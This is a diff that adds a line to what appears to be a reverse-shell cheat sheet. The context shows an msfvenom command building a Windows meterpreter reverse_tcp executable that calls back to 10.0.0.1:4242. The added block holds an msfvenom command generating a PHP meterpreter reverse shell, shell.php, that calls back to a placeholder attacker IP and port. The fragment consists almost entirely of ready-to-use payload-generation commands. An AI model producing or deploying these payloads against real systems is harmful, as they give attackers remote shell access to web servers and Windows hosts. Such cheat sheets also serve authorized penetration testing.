@@ -437,6 +437,10 @@ main() {
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
 ```
 
+```shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<$LOCAL_IP> LPORT=<$LOCAL_PORT> -f raw -o shell.php
+```
+
 ### Windows Stageless reverse TCP
 
 ```powershell
